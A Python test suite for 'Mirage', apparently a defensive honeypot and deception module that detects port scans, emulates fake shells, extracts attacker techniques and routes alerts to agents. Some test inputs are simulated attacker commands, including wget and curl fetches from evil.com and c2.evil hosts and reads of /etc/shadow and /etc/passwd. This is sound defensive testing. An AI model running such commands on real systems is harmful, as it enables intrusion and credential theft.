"""
Mirage Module Tests — Active Deception

Tests covering:
- MirageOrchestrator scan detection and state machine
- AdaptiveHoneypot multi-level interaction
- IntelligenceFeedback TTP extraction and distribution
- MirageBridge AEGIS signal emission
- AEGIS integration (routing rules, tools, SCOUT agent)
- NAPSE EventBus HONEYPOT_TOUCH type
"""

import time
import pytest
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch


# ------------------------------------------------------------------
# MirageOrchestrator Tests
# ------------------------------------------------------------------

class TestMirageOrchestrator:
    """Test scan detection and state machine."""

    def setup_method(self):
        from shared.mirage.orchestrator import MirageOrchestrator, MirageState
        self.MirageState = MirageState
        self.orch = MirageOrchestrator(
            scan_threshold=3,
            scan_window_seconds=30,
        )

    def test_init(self):
        assert self.orch._scan_threshold == 3
        assert len(self.orch._dark_ports) > 0
        assert self.orch.get_stats()["active_trackers"] == 0

    def test_dark_port_detection(self):
        """Connection to a dark port creates a tracker."""
        from core.napse.synthesis.event_bus import ConnectionRecord

        conn = ConnectionRecord(
            ts=time.time(), uid="C1", id_orig_h="10.0.0.99",
            id_orig_p=54321, id_resp_h="10.0.0.1",
            id_resp_p=445, proto="tcp",
        )
        from core.napse.synthesis.event_bus import EventType
        self.orch._on_connection(EventType.CONNECTION, conn)

        tracker = self.orch.get_tracker("10.0.0.99")
        assert tracker is not None
        assert 445 in tracker.ports_probed
        assert tracker.state == self.MirageState.DETECTING

    def test_scan_threshold_triggers_engaging(self):
        """3+ dark port hits in 30s triggers ENGAGING state."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        for port in [445, 3389, 22]:
            conn = ConnectionRecord(
                ts=time.time(), uid=f"C{port}",
                id_orig_h="10.0.0.99", id_orig_p=54321,
                id_resp_h="10.0.0.1", id_resp_p=port, proto="tcp",
            )
            self.orch._on_connection(EventType.CONNECTION, conn)

        tracker = self.orch.get_tracker("10.0.0.99")
        assert tracker.state == self.MirageState.ENGAGING
        assert self.orch.get_stats()["honeypots_deployed"] == 1

    def test_non_dark_port_ignored(self):
        """Connections to non-dark ports don't create trackers."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        conn = ConnectionRecord(
            ts=time.time(), uid="C1", id_orig_h="10.0.0.50",
            id_orig_p=54321, id_resp_h="10.0.0.1",
            id_resp_p=443, proto="tcp",  # 443 is NOT in dark ports
        )
        self.orch._on_connection(EventType.CONNECTION, conn)
        assert self.orch.get_tracker("10.0.0.50") is None

    def test_alert_escalates_detecting(self):
        """Alert for IP in DETECTING state escalates to ENGAGING."""
        from core.napse.synthesis.event_bus import (
            ConnectionRecord, NapseAlert, EventType,
        )

        # First hit → DETECTING
        conn = ConnectionRecord(
            ts=time.time(), uid="C1", id_orig_h="10.0.0.77",
            id_orig_p=54321, id_resp_h="10.0.0.1",
            id_resp_p=22, proto="tcp",
        )
        self.orch._on_connection(EventType.CONNECTION, conn)
        assert self.orch.get_tracker("10.0.0.77").state == self.MirageState.DETECTING

        # Alert → ENGAGING
        alert = NapseAlert(
            timestamp=datetime.utcnow().isoformat(),
            src_ip="10.0.0.77", dest_ip="10.0.0.1",
            alert_signature="ET SCAN Nmap SYN Scan",
        )
        self.orch._on_alert(EventType.ALERT, alert)
        assert self.orch.get_tracker("10.0.0.77").state == self.MirageState.ENGAGING

    def test_state_transitions(self):
        """Full state machine: DORMANT → DETECTING → ENGAGING → PROFILING → LEARNING."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        # Trigger ENGAGING
        for port in [445, 3389, 22]:
            conn = ConnectionRecord(
                ts=time.time(), uid=f"C{port}",
                id_orig_h="10.0.0.88", id_orig_p=54321,
                id_resp_h="10.0.0.1", id_resp_p=port, proto="tcp",
            )
            self.orch._on_connection(EventType.CONNECTION, conn)

        assert self.orch.get_tracker("10.0.0.88").state == self.MirageState.ENGAGING

        # ENGAGING → PROFILING
        assert self.orch.transition_to_profiling("10.0.0.88") is True
        assert self.orch.get_tracker("10.0.0.88").state == self.MirageState.PROFILING

        # PROFILING → LEARNING
        assert self.orch.transition_to_learning("10.0.0.88") is True
        assert self.orch.get_tracker("10.0.0.88").state == self.MirageState.LEARNING

    def test_transition_wrong_state_fails(self):
        """Transition from wrong state returns False."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        conn = ConnectionRecord(
            ts=time.time(), uid="C1", id_orig_h="10.0.0.10",
            id_orig_p=54321, id_resp_h="10.0.0.1",
            id_resp_p=445, proto="tcp",
        )
        self.orch._on_connection(EventType.CONNECTION, conn)

        # DETECTING → can't go to PROFILING directly
        assert self.orch.transition_to_profiling("10.0.0.10") is False

    def test_callbacks_fire(self):
        """Event callbacks are triggered on state changes."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        events = []
        self.orch.on("scan_detected", lambda e, t: events.append(("scan", t.source_ip)))
        self.orch.on("honeypot_deployed", lambda e, t: events.append(("deploy", t.source_ip)))

        for port in [445, 3389, 22]:
            conn = ConnectionRecord(
                ts=time.time(), uid=f"C{port}",
                id_orig_h="10.0.0.55", id_orig_p=54321,
                id_resp_h="10.0.0.1", id_resp_p=port, proto="tcp",
            )
            self.orch._on_connection(EventType.CONNECTION, conn)

        assert ("scan", "10.0.0.55") in events
        assert ("deploy", "10.0.0.55") in events

    def test_get_engaging_ips(self):
        """get_engaging_ips returns IPs in ENGAGING or PROFILING state."""
        from core.napse.synthesis.event_bus import ConnectionRecord, EventType

        for port in [445, 3389, 22]:
            conn = ConnectionRecord(
                ts=time.time(), uid=f"C{port}",
                id_orig_h="10.0.0.33", id_orig_p=54321,
                id_resp_h="10.0.0.1", id_resp_p=port, proto="tcp",
            )
            self.orch._on_connection(EventType.CONNECTION, conn)

        assert "10.0.0.33" in self.orch.get_engaging_ips()

    def test_cleanup_stale(self):
        """Stale DORMANT trackers are cleaned up."""
        from shared.mirage.orchestrator import ScanTracker, MirageState

        tracker = ScanTracker(
            source_ip="192.168.1.1",
            state=MirageState.DORMANT,
            last_seen=datetime.utcnow() - timedelta(hours=2),
        )
        self.orch._trackers["192.168.1.1"] = tracker

        removed = self.orch.cleanup_stale(max_age_minutes=60)
        assert removed == 1
        assert self.orch.get_tracker("192.168.1.1") is None

    def test_flow_metadata_handler(self):
        """Flow metadata with dark port triggers detection."""
        from core.napse.synthesis.event_bus import EventType

        metadata = {
            "src_ip": "10.0.0.42",
            "dest_port": 3306,
            "proto": "tcp",
        }
        self.orch._on_flow_metadata(EventType.FLOW_METADATA, metadata)
        tracker = self.orch.get_tracker("10.0.0.42")
        assert tracker is not None
        assert 3306 in tracker.ports_probed

    def test_honeypot_touch_handler(self):
        """HONEYPOT_TOUCH event escalates to ENGAGING."""
        from core.napse.synthesis.event_bus import EventType

        touch = {"source_ip": "10.0.0.77", "dest_port": 22}
        self.orch._on_honeypot_touch(EventType.HONEYPOT_TOUCH, touch)

        tracker = self.orch.get_tracker("10.0.0.77")
        assert tracker.state == self.MirageState.ENGAGING


# ------------------------------------------------------------------
# AdaptiveHoneypot Tests
# ------------------------------------------------------------------

class TestAdaptiveHoneypot:
    """Test multi-level interaction engine."""

    def setup_method(self):
        from shared.mirage.adaptive_honeypot import (
            AdaptiveHoneypot, InteractionLevel, SophisticationLevel,
        )
        self.InteractionLevel = InteractionLevel
        self.SophisticationLevel = SophisticationLevel
        self.hp = AdaptiveHoneypot(max_sessions=10)

    def test_banner_response(self):
        """Level 1 returns service banner."""
        banner = self.hp.handle_banner_request("10.0.0.1", 22)
        assert "SSH" in banner
        session = self.hp.get_session("10.0.0.1")
        assert session is not None
        assert 22 in session.ports_interacted

    def test_auth_fails_then_succeeds(self):
        """First 2 auth attempts fail, 3rd succeeds."""
        result1 = self.hp.handle_auth_attempt("10.0.0.1", "admin", "admin")
        assert result1["success"] is False

        result2 = self.hp.handle_auth_attempt("10.0.0.1", "admin", "password")
        assert result2["success"] is False

        result3 = self.hp.handle_auth_attempt("10.0.0.1", "admin", "1234")
        assert result3["success"] is True
        assert "prompt" in result3

    def test_auth_escalates_to_level2(self):
        """Auth attempt escalates session to Level 2."""
        self.hp.handle_auth_attempt("10.0.0.1", "root", "root")
        session = self.hp.get_session("10.0.0.1")
        assert session.level >= self.InteractionLevel.AUTH

    def test_shell_command_execution(self):
        """Level 3 commands return fake responses."""
        output = self.hp.handle_command("10.0.0.1", "whoami")
        assert output == "admin"

        output = self.hp.handle_command("10.0.0.1", "ls /etc")
        assert "passwd" in output

        output = self.hp.handle_command("10.0.0.1", "cat /etc/passwd")
        assert "root" in output

    def test_unknown_command(self):
        """Unknown commands return 'command not found'."""
        output = self.hp.handle_command("10.0.0.1", "supersecrettool")
        assert "command not found" in output

    def test_payload_detection(self):
        """wget/curl commands are flagged as payloads."""
        events = []
        self.hp.on("payload_captured", lambda e, s: events.append(s.source_ip))

        self.hp.handle_command("10.0.0.1", "wget http://evil.com/backdoor.sh")
        session = self.hp.get_session("10.0.0.1")
        assert len(session.payloads_captured) == 1
        assert "10.0.0.1" in events

    def test_sophistication_naive(self):
        """Default credential attempts classified as NAIVE."""
        self.hp.handle_auth_attempt("10.0.0.1", "admin", "admin")
        session = self.hp.get_session("10.0.0.1")
        assert session.sophistication == self.SophisticationLevel.NAIVE

    def test_sophistication_intermediate(self):
        """Multiple port interaction classified as INTERMEDIATE."""
        self.hp.handle_banner_request("10.0.0.1", 22)
        self.hp.handle_banner_request("10.0.0.1", 3389)
        self.hp.handle_banner_request("10.0.0.1", 445)
        session = self.hp.get_session("10.0.0.1")
        assert session.sophistication >= self.SophisticationLevel.INTERMEDIATE

    def test_sophistication_advanced(self):
        """Enumeration commands classified as ADVANCED."""
        # Start with auth to establish session
        for _ in range(3):
            self.hp.handle_auth_attempt("10.0.0.1", "deploy", "Pr0d#2024!")
        # Execute enumeration commands
        self.hp.handle_command("10.0.0.1", "cat /etc/shadow")
        self.hp.handle_command("10.0.0.1", "cat /proc/version")
        self.hp.handle_command("10.0.0.1", "grep -r password /opt")
        session = self.hp.get_session("10.0.0.1")
        assert session.sophistication == self.SophisticationLevel.ADVANCED

    def test_session_close(self):
        """Closing a session returns the session data."""
        self.hp.handle_banner_request("10.0.0.1", 22)
        session = self.hp.close_session("10.0.0.1")
        assert session is not None
        assert session.source_ip == "10.0.0.1"
        assert self.hp.get_session("10.0.0.1") is None

    def test_session_eviction(self):
        """Oldest session evicted when max reached."""
        for i in range(12):  # max=10
            self.hp.handle_banner_request(f"10.0.0.{i}", 22)
        assert len(self.hp._sessions) <= 10

    def test_raw_payload_capture(self):
        """handle_payload captures raw bytes."""
        self.hp.handle_payload("10.0.0.1", b"\x00\x01\x02payload", 4444)
        session = self.hp.get_session("10.0.0.1")
        assert session.bytes_received == 10
        assert len(session.payloads_captured) == 1

    def test_profiling_transition(self):
        """After 5 commands, orchestrator transition_to_profiling is called."""
        mock_orch = MagicMock()
        self.hp._orchestrator = mock_orch

        for i in range(6):
            self.hp.handle_command("10.0.0.1", f"cmd{i}")

        mock_orch.transition_to_profiling.assert_called_once_with("10.0.0.1")

    def test_banner_for_various_ports(self):
        """Banner generation covers common ports."""
        assert "SSH" in self.hp.handle_banner_request("10.0.0.1", 22)
        assert "FTP" in self.hp.handle_banner_request("10.0.0.2", 21)
        assert "Redis" in self.hp.handle_banner_request("10.0.0.3", 6379)
        assert "PostgreSQL" in self.hp.handle_banner_request("10.0.0.4", 5432)

    def test_stats(self):
        """Stats track session counts and interactions."""
        self.hp.handle_banner_request("10.0.0.1", 22)
        self.hp.handle_auth_attempt("10.0.0.2", "root", "root")
        self.hp.handle_command("10.0.0.3", "whoami")
        stats = self.hp.get_stats()
        assert stats["sessions_created"] == 3
        assert stats["level1_responses"] >= 1
        assert stats["level2_responses"] >= 1
        assert stats["level3_responses"] >= 1


# ------------------------------------------------------------------
# IntelligenceFeedback Tests
# ------------------------------------------------------------------

class TestIntelligenceFeedback:
    """Test TTP extraction and intel distribution."""

    def setup_method(self):
        from shared.mirage.intelligence_feedback import (
            IntelligenceFeedback, IntelType, ThreatIntel,
        )
        self.IntelType = IntelType
        self.ThreatIntel = ThreatIntel
        self.feedback = IntelligenceFeedback()

    def test_scan_detected_creates_intel(self):
        """on_scan_detected generates SCAN_PATTERN intel."""
        from shared.mirage.orchestrator import ScanTracker

        intel_received = []
        self.feedback.register_consumer("test", lambda i: intel_received.append(i))

        tracker = ScanTracker(source_ip="10.0.0.99")
        tracker.ports_probed = {22, 445, 3389}
        self.feedback.on_scan_detected("scan_detected", tracker)

        assert len(intel_received) == 1
        assert intel_received[0].intel_type == self.IntelType.SCAN_PATTERN
        assert "T1046" in intel_received[0].mitre_techniques

    def test_session_closed_extracts_ttps(self):
        """on_session_closed extracts TTPs from commands."""
        from shared.mirage.adaptive_honeypot import (
            HoneypotSession, InteractionLevel, SophisticationLevel,
        )

        session = HoneypotSession(source_ip="10.0.0.50")
        session.sophistication = SophisticationLevel.INTERMEDIATE
        session.commands_received = [
            "uname -a",
            "cat /etc/passwd",
            "wget http://evil.com/tool.sh",
            "ifconfig",
            "ps aux",
        ]

        self.feedback.on_session_closed("session_closed", session)

        profile = self.feedback.get_profile("10.0.0.50")
        assert profile is not None
        assert "T1082" in profile.techniques  # System Info
        assert "T1087" in profile.techniques  # Account Discovery
        assert "T1105" in profile.techniques  # Ingress Tool Transfer
        assert "T1016" in profile.techniques  # Network Config Discovery
        assert profile.commands_executed == 5

    def test_payload_captured_generates_intel(self):
        """on_payload_captured generates PAYLOAD_HASH intel."""
        from shared.mirage.adaptive_honeypot import HoneypotSession

        intel_received = []
        self.feedback.register_consumer("test", lambda i: intel_received.append(i))

        session = HoneypotSession(source_ip="10.0.0.77")
        session.payloads_captured = ["abc123hash"]
        session.commands_received = ["curl http://c2.evil/stage2"]

        self.feedback.on_payload_captured("payload_captured", session)

        assert len(intel_received) == 1
        assert intel_received[0].intel_type == self.IntelType.PAYLOAD_HASH

    def test_qsecbit_threat_event_format(self):
        """create_qsecbit_threat_event returns valid format."""
        intel = self.ThreatIntel(
            intel_type=self.IntelType.SCAN_PATTERN,
            source_ip="10.0.0.1",
            confidence=0.7,
            mitre_techniques=["T1046"],
            ioc_value="10.0.0.1",
            ioc_type="ip",
        )
        event = self.feedback.create_qsecbit_threat_event(intel)
        assert event["source"] == "mirage"
        assert event["severity"] == "MEDIUM"
        assert event["confidence"] == 0.7
        assert "T1046" in event["mitre_techniques"]

    def test_mesh_gossip_payload_format(self):
        """create_mesh_gossip_payload returns valid format."""
        intel = self.ThreatIntel(
            intel_type=self.IntelType.C2_INDICATOR,
            source_ip="10.0.0.1",
            confidence=0.95,
            ioc_value="evil-c2.com",
            ioc_type="domain",
        )
        payload = self.feedback.create_mesh_gossip_payload(intel)
        assert payload["type"] == "mirage_intel"
        assert payload["intel_type"] == "c2_indicator"
        assert payload["ioc_value"] == "evil-c2.com"

    def test_threat_score_calculation(self):
        """AttackerTTPProfile.threat_score reflects behavior."""
        from shared.mirage.intelligence_feedback import AttackerTTPProfile

        profile = AttackerTTPProfile(source_ip="10.0.0.1")
        assert profile.threat_score == 0.0

        profile.techniques = {"T1046", "T1082", "T1105"}
        profile.payloads_captured = 2
        profile.sophistication = "ADVANCED"
        score = profile.threat_score
        assert score > 0.5

    def test_multiple_consumers(self):
        """Multiple consumers all receive intel."""
        from shared.mirage.orchestrator import ScanTracker

        received = {"a": [], "b": []}
        self.feedback.register_consumer("a", lambda i: received["a"].append(i))
        self.feedback.register_consumer("b", lambda i: received["b"].append(i))

        tracker = ScanTracker(source_ip="10.0.0.1")
        tracker.ports_probed = {22}
        self.feedback.on_scan_detected("scan_detected", tracker)

        assert len(received["a"]) == 1
        assert len(received["b"]) == 1

    def test_stats(self):
        """Stats track intel generation."""
        from shared.mirage.orchestrator import ScanTracker

        tracker = ScanTracker(source_ip="10.0.0.1")
        tracker.ports_probed = {22}
        self.feedback.on_scan_detected("scan_detected", tracker)

        stats = self.feedback.get_stats()
        assert stats["intel_generated"] == 1
        assert stats["profiles_created"] == 1


# ------------------------------------------------------------------
# MirageBridge Tests
# ------------------------------------------------------------------

class TestMirageBridge:
    """Test AEGIS signal emission."""

    def setup_method(self):
        from shared.mirage.mirage_bridge import MirageBridge
        self.signals = []
        self.bridge = MirageBridge(
            signal_callback=lambda s: self.signals.append(s),
        )

    def test_scan_detected_emits_signal(self):
        """Scan detection emits MEDIUM severity signal."""
        from shared.mirage.orchestrator import ScanTracker, MirageState

        tracker = ScanTracker(source_ip="10.0.0.99")
        tracker.ports_probed = {22, 445}
        tracker.transition(MirageState.DETECTING)

        self.bridge._on_scan_detected("scan_detected", tracker)

        assert len(self.signals) == 1
        assert self.signals[0].source == "mirage"
        assert self.signals[0].event_type == "scan.detected"
        assert self.signals[0].severity == "MEDIUM"

    def test_honeypot_deployed_emits_signal(self):
        """Honeypot deployment emits signal."""
        from shared.mirage.orchestrator import ScanTracker, MirageState

        tracker = ScanTracker(source_ip="10.0.0.55")
        tracker.ports_probed = {22, 445, 3389}
        tracker.transition(MirageState.ENGAGING)

        self.bridge._on_honeypot_deployed("honeypot_deployed", tracker)

        assert len(self.signals) == 1
        assert self.signals[0].event_type == "mirage.honeypot_deployed"

    def test_attacker_profiled_emits_high(self):
        """Attacker profiled emits HIGH severity signal."""
        from shared.mirage.orchestrator import ScanTracker, MirageState

        tracker = ScanTracker(source_ip="10.0.0.44")
        tracker.transition(MirageState.PROFILING)
        tracker.alert_count = 5

        self.bridge._on_attacker_profiled("attacker_profiled", tracker)

        assert len(self.signals) == 1
        assert self.signals[0].severity == "HIGH"
        assert "attacker_profiled" in self.signals[0].event_type

    def test_payload_captured_emits_high(self):
        """Payload capture emits HIGH severity signal."""
        from shared.mirage.adaptive_honeypot import (
            HoneypotSession, InteractionLevel, SophisticationLevel,
        )

        session = HoneypotSession(source_ip="10.0.0.77")
        session.level = InteractionLevel.SHELL
        session.sophistication = SophisticationLevel.INTERMEDIATE
        session.payloads_captured = ["hash123"]

        self.bridge._on_payload_captured("payload_captured", session)

        assert len(self.signals) == 1
        assert self.signals[0].severity == "HIGH"

    def test_connect_wires_callbacks(self):
        """connect() wires bridge to orchestrator and honeypot."""
        from shared.mirage.orchestrator import MirageOrchestrator
        from shared.mirage.adaptive_honeypot import AdaptiveHoneypot

        orch = MirageOrchestrator()
        hp = AdaptiveHoneypot()

        self.bridge.connect(orch, honeypot=hp)

        # Verify callbacks are registered
        assert len(orch._callbacks["scan_detected"]) >= 1
        assert len(hp._callbacks["level_escalated"]) >= 1

    def test_no_callback_drops_signal(self):
        """Without callback, signals are dropped gracefully."""
        from shared.mirage.mirage_bridge import MirageBridge
        from shared.mirage.orchestrator import ScanTracker, MirageState

        bridge = MirageBridge(signal_callback=None)  # No callback
        tracker = ScanTracker(source_ip="10.0.0.1")
        bridge._on_scan_detected("scan_detected", tracker)
        # Should not raise

    def test_stats(self):
        """Stats track emitted signals."""
        from shared.mirage.orchestrator import ScanTracker

        tracker = ScanTracker(source_ip="10.0.0.1")
        tracker.ports_probed = {22}
        self.bridge._on_scan_detected("scan_detected", tracker)

        stats = self.bridge.get_stats()
        assert stats["signals_emitted"] == 1


# ------------------------------------------------------------------
# AEGIS Integration Tests
# ------------------------------------------------------------------

class TestAegisIntegration:
    """Test AEGIS routing rules, tools, and SCOUT agent updates."""

    def test_routing_rules_include_mirage(self):
        """AEGIS routing rules include mirage.* patterns."""
        from core.aegis.orchestrator import ROUTING_RULES

        assert "mirage.honeypot_deployed" in ROUTING_RULES
        assert "mirage.attacker_profiled" in ROUTING_RULES
        assert "mirage.attacker_learning" in ROUTING_RULES
        assert "mirage.payload_captured" in ROUTING_RULES
        assert "mirage.level_escalated" in ROUTING_RULES
        assert "mirage.intel" in ROUTING_RULES

        assert "SCOUT" in ROUTING_RULES["mirage.honeypot_deployed"]
        assert "GUARDIAN" in ROUTING_RULES["mirage.attacker_profiled"]
        assert "MEDIC" in ROUTING_RULES["mirage.attacker_learning"]

    def test_mirage_tools_registered(self):
        """deploy_honeypot, engage_attacker, profile_attacker_ttps in registry."""
        from core.aegis.tool_executor import TOOL_REGISTRY

        assert "deploy_honeypot" in TOOL_REGISTRY
        assert "engage_attacker" in TOOL_REGISTRY
        assert "profile_attacker_ttps" in TOOL_REGISTRY

        # Check SCOUT has access
        assert "SCOUT" in TOOL_REGISTRY["deploy_honeypot"].agents
        assert "SCOUT" in TOOL_REGISTRY["engage_attacker"].agents
        assert "SCOUT" in TOOL_REGISTRY["profile_attacker_ttps"].agents

    def test_scout_allowed_tools_updated(self):
        """SCOUT agent's allowed_tools includes mirage tools."""
        from core.aegis.agents.scout_agent import ScoutAgent

        agent = ScoutAgent.__new__(ScoutAgent)
        assert "deploy_honeypot" in ScoutAgent.allowed_tools
        assert "engage_attacker" in ScoutAgent.allowed_tools
        assert "profile_attacker_ttps" in ScoutAgent.allowed_tools

    def test_permission_matrix_includes_mirage(self):
        """Permission matrix auto-built from TOOL_REGISTRY includes mirage tools."""
        from core.aegis.tool_executor import PERMISSION_MATRIX

        assert "deploy_honeypot" in PERMISSION_MATRIX.get("SCOUT", [])
        assert "engage_attacker" in PERMISSION_MATRIX.get("SCOUT", [])
        assert "profile_attacker_ttps" in PERMISSION_MATRIX.get("SCOUT", [])
        assert "profile_attacker_ttps" in PERMISSION_MATRIX.get("GUARDIAN", [])

    def test_scout_handles_mirage_signal(self):
        """SCOUT agent responds to mirage source signals."""
        from core.aegis.agents.scout_agent import ScoutAgent
        from core.aegis.types import StandardSignal

        agent = ScoutAgent.__new__(ScoutAgent)
        agent.name = "SCOUT"

        signal = StandardSignal(
            source="mirage",
            event_type="mirage.honeypot_deployed",
            severity="MEDIUM",
            data={"source_ip": "10.0.0.99", "ports_probed": [22, 445]},
        )

        response = agent.respond_to_signal(signal)
        assert response.agent == "SCOUT"
        assert response.action == "engage_attacker"
        assert "Mirage" in response.sources

    def test_scout_handles_payload_capture(self):
        """SCOUT escalates to GUARDIAN on advanced payload capture."""
        from core.aegis.agents.scout_agent import ScoutAgent
        from core.aegis.types import StandardSignal

        agent = ScoutAgent.__new__(ScoutAgent)
        agent.name = "SCOUT"

        signal = StandardSignal(
            source="mirage",
            event_type="mirage.payload_captured",
            severity="HIGH",
            data={
                "source_ip": "10.0.0.77",
                "sophistication": "ADVANCED",
                "payload_count": 3,
            },
        )

        response = agent.respond_to_signal(signal)
        assert response.agent == "SCOUT"
        assert response.escalate_to == "GUARDIAN"

    def test_scout_handles_attacker_profiled(self):
        """SCOUT agent responds to attacker profiled signal."""
        from core.aegis.agents.scout_agent import ScoutAgent
        from core.aegis.types import StandardSignal

        agent = ScoutAgent.__new__(ScoutAgent)
        agent.name = "SCOUT"

        signal = StandardSignal(
            source="mirage",
            event_type="mirage.attacker_profiled",
            severity="HIGH",
            data={"source_ip": "10.0.0.44"},
        )

        response = agent.respond_to_signal(signal)
        assert response.action == "profile_attacker_ttps"

    def test_orchestrator_routes_mirage_signals(self):
        """Orchestrator correctly routes mirage.* signals to agents."""
        from core.aegis.orchestrator import AegisOrchestrator
        from core.aegis.types import StandardSignal

        orchestrator = AegisOrchestrator.__new__(AegisOrchestrator)
        # Minimal init for route_signal
        orchestrator.registry = MagicMock()
        orchestrator.registry.find_all_agents.return_value = []

        signal = StandardSignal(
            source="mirage",
            event_type="mirage.honeypot_deployed",
            severity="MEDIUM",
            data={},
        )

        agents = orchestrator.route_signal(signal)
        agent_names = [a[0] for a in agents]
        assert "SCOUT" in agent_names


# ------------------------------------------------------------------
# NAPSE EventBus Tests
# ------------------------------------------------------------------

class TestNapseEventBusHoneypotTouch:
    """Test HONEYPOT_TOUCH event type."""

    def test_honeypot_touch_event_type_exists(self):
        """HONEYPOT_TOUCH is a valid EventType."""
        from core.napse.synthesis.event_bus import EventType

        assert hasattr(EventType, "HONEYPOT_TOUCH")

    def test_subscribe_and_emit_honeypot_touch(self):
        """Can subscribe to and emit HONEYPOT_TOUCH events."""
        from core.napse.synthesis.event_bus import NapseEventBus, EventType

        bus = NapseEventBus()
        received = []
        bus.subscribe(EventType.HONEYPOT_TOUCH, lambda t, e: received.append(e))
        bus.emit(EventType.HONEYPOT_TOUCH, {"source_ip": "10.0.0.1", "dest_port": 22})

        assert len(received) == 1
        assert received[0]["source_ip"] == "10.0.0.1"


# ------------------------------------------------------------------
# End-to-End Integration Test
# ------------------------------------------------------------------

class TestMirageEndToEnd:
    """Test the full Mirage pipeline from NAPSE event to AEGIS signal."""

    def test_full_pipeline(self):
        """NAPSE scan → Mirage detection → AEGIS signal."""
        from core.napse.synthesis.event_bus import (
            NapseEventBus, EventType, ConnectionRecord,
        )
        from shared.mirage.orchestrator import MirageOrchestrator
        from shared.mirage.adaptive_honeypot import AdaptiveHoneypot
        from shared.mirage.intelligence_feedback import IntelligenceFeedback
        from shared.mirage.mirage_bridge import MirageBridge

        # Setup
        bus = NapseEventBus()
        orch = MirageOrchestrator(scan_threshold=3, scan_window_seconds=30)
        hp = AdaptiveHoneypot(orchestrator=orch)
        feedback = IntelligenceFeedback(orchestrator=orch)
        signals = []
        bridge = MirageBridge(signal_callback=lambda s: signals.append(s))

        # Wire everything
        orch.register_with_event_bus(bus)
        bridge.connect(orch, honeypot=hp, feedback=feedback)

        # Wire feedback to orchestrator callbacks
        orch.on("scan_detected", feedback.on_scan_detected)
        orch.on("honeypot_deployed", feedback.on_honeypot_deployed)
        orch.on("attacker_profiled", feedback.on_attacker_profiled)

        # Simulate 10-port scan (emitted through NAPSE EventBus)
        for port in [22, 23, 445, 3389, 1433, 3306, 5900, 6379, 9100, 5432]:
            conn = ConnectionRecord(
                ts=time.time(),
                uid=f"C{port}",
                id_orig_h="192.168.1.100",
                id_orig_p=54321,
                id_resp_h="10.200.0.1",
                id_resp_p=port,
                proto="tcp",
            )
            bus.emit(EventType.CONNECTION, conn)

        # Verify: scan detected → honeypot deployed → AEGIS signal
        tracker = orch.get_tracker("192.168.1.100")
        assert tracker is not None
        assert len(tracker.ports_probed) == 10

        # Should have emitted signals to AEGIS
        assert len(signals) >= 2  # scan_detected + honeypot_deployed
        signal_types = [s.event_type for s in signals]
        assert "scan.detected" in signal_types
        assert "mirage.honeypot_deployed" in signal_types

        # Intel should have been generated
        profile = feedback.get_profile("192.168.1.100")
        assert profile is not None
        assert "T1046" in profile.techniques

        # Stats should reflect activity
        assert orch.get_stats()["scans_detected"] >= 1
        assert orch.get_stats()["honeypots_deployed"] >= 1
